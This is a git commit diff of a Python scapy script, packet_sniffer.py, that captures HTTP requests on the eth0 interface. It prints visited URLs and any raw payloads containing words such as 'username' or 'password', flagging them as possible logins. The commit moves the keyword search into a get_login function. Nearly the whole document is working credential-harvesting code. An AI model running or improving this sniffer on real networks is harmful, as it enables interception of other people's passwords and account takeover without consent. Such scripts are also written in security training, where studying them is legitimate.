9e12dd51d725de328055f0c0d8fa5240a883af0a
mthwbrwn <mthwbrwn@gmail.com>
2019-06-24 03:40:30 -0700

    refactored login search into function

--- packet_sniffer.py
+++ packet_sniffer.py
@@ -6,6 +6,17 @@ from scapy.layers import http
 def sniff(interface):
     scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
 
+def get_url():
+    pass
+
+
+def get_login(packet):
+    load = packet[scapy.Raw].load
+    keywords = ['username', 'user', 'login', 'password', 'pass']
+    for key in keywords:
+        if key in load:
+            return load
+
 
 def process_sniffed_packet(packet):
     if packet.haslayer(http.HTTPRequest):
@@ -13,12 +24,8 @@ def process_sniffed_packet(packet):
         host_path = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
         print(host_path)
         if packet.haslayer(scapy.Raw):
-            load = packet[scapy.Raw].load
-            # print (load)
-            keywords = ['username', 'user', 'login', 'password', 'pass']
-            for key in keywords:
-                if key in load:
-                    print(load)
-                    break
+            poss_login = get_login(packet)
+            if poss_login:
+                print('\n\n**possible user/password  > ' + poss_login + ' **\n\n')
 
 sniff('eth0')
